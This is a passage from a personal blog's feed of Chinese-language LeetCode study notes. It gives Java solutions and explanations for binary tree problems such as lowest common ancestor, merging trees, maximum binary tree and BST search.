= res.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">findMode1</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        findMode1(root.left);</span><br><span class="line">        <span class="keyword">if</span>(pre == <span class="literal">null</span> || pre.val != root.val) &#123;</span><br><span class="line">            count = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(count &gt; maxCount) &#123;</span><br><span class="line">            <span class="comment">//清除后更新</span></span><br><span class="line">            res.clear();</span><br><span class="line">            res.add(root.val);</span><br><span class="line">            maxCount = count;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(count == maxCount) &#123;</span><br><span class="line">            res.add(root.val);</span><br><span class="line">        &#125;</span><br><span class="line">        pre = root;</span><br><span class="line">        findMode1(root.right);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树的最近公共祖先"><a href="#二叉搜索树的最近公共祖先" class="headerlink" title="二叉搜索树的最近公共祖先"></a>二叉搜索树的最近公共祖先</h4><p>link:<a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/description/">236. 二叉树的最近公共祖先 - 力扣（LeetCode）</a></p><h5 id="思路分析-3"><a href="#思路分析-3" class="headerlink" title="思路分析"></a>思路分析</h5><p>可以使用两个栈来存储从根节点到 <code>p</code> 和 <code>q</code> 的路径，然后通过比较这两个路径来找到它们的最低公共祖先</p><h6 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">getPath</span><span class="params">(TreeNode root, TreeNode node, Stack&lt;TreeNode&gt; stack)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span> || node == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    stack.push(root);</span><br><span class="line">    <span class="keyword">if</span> (root == node) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flg</span> <span class="operator">=</span> getPath(root.left, node, stack);</span><br><span class="line">    <span class="keyword">if</span> (flg) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flg2</span> <span class="operator">=</span> getPath(root.right, node, stack);</span><br><span class="line">    <span class="keyword">if</span> (flg2) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    stack.pop();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Stack&lt;TreeNode&gt; stackP = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&gt; stackQ = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    getPath(root, p, stackP);</span><br><span class="line">    getPath(root, q, stackQ);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">sizeP</span> <span class="operator">=</span> stackP.size();</span><br><span class="line">    <span class="type">int</span> <span class="variable">sizeQ</span> <span class="operator">=</span> stackQ.size();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sizeP &gt; sizeQ) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> sizeP - sizeQ;</span><br><span class="line">        <span class="keyword">while</span> (size != <span class="number">0</span>) &#123;</span><br><span class="line">            stackP.pop();</span><br><span class="line">            size--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> sizeQ - sizeP;</span><br><span class="line">        <span class="keyword">while</span> (size != <span class="number">0</span>) &#123;</span><br><span class="line">            stackQ.pop();</span><br><span class="line">            size--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!stackP.isEmpty() &amp;&amp; !stackQ.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stackP.peek().equals(stackQ.peek())) &#123;</span><br><span class="line">            <span class="keyword">return</span> stackP.peek();</span><br><span class="line">        &#125;</span><br><span class="line">        stackP.pop();</span><br><span class="line">        stackQ.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="DFS（后序遍历）"><a href="#DFS（后序遍历）" class="headerlink" title="DFS（后序遍历）"></a>DFS（后序遍历）</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span> || root == p || root == q) &#123; <span class="comment">// 递归结束条件</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后序遍历</span></span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left, p, q);</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right, p, q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (left == <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) &#123; <span class="comment">// 若未找到节点 p 或 q</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left == <span class="literal">null</span> &amp;&amp; right != <span class="literal">null</span>) &#123; <span class="comment">// 若找到一个节点</span></span><br><span class="line">        <span class="keyword">return</span> right;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left != <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) &#123; <span class="comment">// 若找到一个节点</span></span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 若找到两个节点</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;验证二叉搜索树&quot;&gt;&lt;a href=&quot;#验证二叉搜索树&quot; class=&quot;headerlink&quot; title=&quot;验证二叉搜索树&quot;&gt;&lt;/a&gt;验证二叉搜索树&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/validat</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x13</title>
    <link href="https://yubut.github.io/2024/11/13/yub%E3%81%AEAlgorithm.0x13/"/>
    <id>https://yubut.github.io/2024/11/13/yub%E3%81%AEAlgorithm.0x13/</id>
    <published>2024-11-13T07:10:48.000Z</published>
    <updated>2024-11-14T13:10:43.259Z</updated>
    
    <content type="html"><![CDATA[<h4 id="最大二叉树"><a href="#最大二叉树" class="headerlink" title="最大二叉树"></a>最大二叉树</h4><p>link：<a href="https://leetcode.cn/problems/maximum-binary-tree/description/">654. 最大二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>在数组中遍历找到最大值（根节点），分割得到左右子树，再回溯遍历左右子树（还是先找到最大值作为子树的根节点再遍历）</p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">constructMaximumBinaryTree</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> constructMaximumBinaryTree1(nums,<span class="number">0</span>,nums.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">constructMaximumBinaryTree1</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> leftIndex, <span class="type">int</span> rightIndex)</span> &#123;</span><br><span class="line">        <span class="comment">//没有元素了</span></span><br><span class="line">        <span class="keyword">if</span>(rightIndex - leftIndex == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//只有一个元素 直接加入</span></span><br><span class="line">        <span class="keyword">if</span>(rightIndex - leftIndex == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>  <span class="keyword">new</span> <span class="title class_">TreeNode</span>(nums[leftIndex]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxIndex</span> <span class="operator">=</span> leftIndex;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> nums[leftIndex];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> leftIndex; i &lt; rightIndex; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; maxVal) &#123;</span><br><span class="line">                maxVal = nums[i];</span><br><span class="line">                maxIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(maxVal);</span><br><span class="line">        <span class="comment">//划分左右子树</span></span><br><span class="line">        root.left = constructMaximumBinaryTree1(nums,leftIndex,maxIndex);</span><br><span class="line">        root.right = constructMaximumBinaryTree1(nums,maxIndex + <span class="number">1</span>,rightIndex);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong></p><p><strong>左闭右开区间的优点</strong><br>1.简化边界处理：使用左闭右开区间 <code>[leftIndex, rightIndex)</code> 意味着 <code>rightIndex</code> 是<strong>不包含的结束边界</strong>.</p><p>2.递归的分区更直观：分区时可以直接用 <code>leftIndex</code> 到 <code>maxIndex</code> 和 <code>maxIndex + 1</code> 到 <code>rightIndex</code>，无需额外调整索引。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root.left = constructMaximumBinaryTree1(nums, leftIndex, maxIndex);</span><br><span class="line">root.right = constructMaximumBinaryTree1(nums, maxIndex + <span class="number">1</span>, rightIndex);</span><br></pre></td></tr></table></figure><p>3.避免边界错误：半开区间让右边界始终指向范围的下一个位置，避免了因“是否包含结束位置”而导致的边界错误，尤其在处理数组下标时可以减少出错的风险.</p><h4 id="合并二叉树"><a href="#合并二叉树" class="headerlink" title="合并二叉树"></a>合并二叉树</h4><p>link：<a href="https://leetcode.cn/problems/merge-two-binary-trees/description/">617. 合并二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>虽然题目说了合并过程必须从根节点开始，但是我们给定的数据内容已经满足条件（hh 冤大头 还想着要先判断一下大小）<br>直接无脑加就是了，主要就是判空递归.</p><h6 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">mergeTrees</span><span class="params">(TreeNode root1, TreeNode root2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root1;</span><br><span class="line">        &#125;</span><br><span class="line">        root1.val += root2.val;</span><br><span class="line">        <span class="comment">//递归</span></span><br><span class="line">        root1.left = mergeTrees(root1.left,root2.left);</span><br><span class="line">        root1.right = mergeTrees(root1.right,root2.right);</span><br><span class="line">        <span class="keyword">return</span> root1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树中的搜索"><a href="#二叉搜索树中的搜索" class="headerlink" title="二叉搜索树中的搜索"></a>二叉搜索树中的搜索</h4><p>link：<a href="https://leetcode.cn/problems/search-in-a-binary-search-tree/description/">700. 二叉搜索树中的搜索 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>因为给的是二叉搜索树，最邻近的左子树根节点比root小，最邻近的右子树根节点比root大，所以用val和跟root比较，再遍历递归对应的子树即可.（相当于左右划分）</p><h6 id="递归-2"><a href="#递归-2" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">searchBST</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">         <span class="keyword">if</span>(root == <span class="literal">null</span> || root.val == val) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">if</span>(val &lt; root.val) &#123;</span><br><span class="line">            <span class="keyword">return</span> searchBST(root.left, val);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> searchBST(root.right, val);</span><br><span class="line">        &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">searchBST</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(root != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(val &lt; root.val)&#123;</span><br><span class="line">                root = root.left;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(val &gt; root.val) &#123;</span><br><span class="line">                root = root.right;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;最大二叉树&quot;&gt;&lt;a href=&quot;#最大二叉树&quot; class=&quot;headerlink&quot; title=&quot;最大二叉树&quot;&gt;&lt;/a&gt;最大二叉树&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/maximum-binary-</summary>
      
    
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x12</title>
    <link href="https://yubut.github.io/2024/11/10/yub%E3%81%AEAlgorithm.0x12/"/>
    <id>https://yubut.github.io/2024/11/10/yub%E3%81%AEAlgorithm.0x12/</id>
    <published>2024-11-10T06:50:58.000Z</published>
    <updated>2024-11-12T14:14:28.702Z</updated>
    
    <content type="html"><![CDATA[<h4 id="找树左下角的值"><a href="#找树左下角的值" class="headerlink" title="找树左下角的值"></a>找树左下角的值</h4><p>link：<a href="https://leetcode.cn/problems/find-bottom-left-tree-value/description/">513. 找树左下角的值 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>看题目给出的样例分析，觉得可以从深度入手.如果是左子树深度最大，那直接输出最左边的左子树节点即可（只有一个左节点的话也是如出一辙）<br>又假设二叉树中至少有一个节点，就已经列举出一种特殊需要判断的情况了.</p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//定义为-1 确保只有一个节点时也能成功遍历</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">Deepth</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findBottomLeftValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">         result = root.val;</span><br><span class="line">         exrloration(root,<span class="number">0</span>);</span><br><span class="line">         <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exrloration</span><span class="params">(TreeNode node,<span class="type">int</span> deepth)</span> &#123;</span><br><span class="line">        <span class="comment">//其实题目描述已经避免这种情况了</span></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node.left == <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(deepth &gt; Deepth) &#123;</span><br><span class="line">                Deepth = deepth;</span><br><span class="line">                result = node.val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">               exrloration(node.left,deepth+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">               <span class="keyword">if</span>(node.right!= <span class="literal">null</span>) &#123;</span><br><span class="line">               exrloration(node.right,deepth+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="路径总和"><a href="#路径总和" class="headerlink" title="路径总和"></a>路径总和</h4><p>link：<a href="https://leetcode.cn/problems/path-sum/description/">112. 路径总和 - 